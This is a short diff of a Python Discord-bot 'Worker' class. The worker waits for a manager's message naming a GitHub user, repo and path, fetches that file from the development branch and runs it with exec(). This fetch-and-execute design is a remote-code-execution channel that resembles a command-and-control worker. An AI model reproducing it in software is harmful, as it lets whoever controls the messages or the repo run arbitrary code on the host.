@@ -37,12 +37,10 @@ class Worker:
     order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
     order = order.content
     user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
-    repo_obj = self.ghub.get_repo(f"{user}/{repo}")
-
-    page = repo_obj.get_contents(path).decoded_content.decode()
+    page = git(0, 0, 2, author=user, repo=repo, target=path, branch="development")
 
     try:
       exec(str(page))
     except Exception as e:
-      print("Error in exec, prep: " + str(e))
+      print("Error in exec, hear(): " + str(e))
       print(str(page))
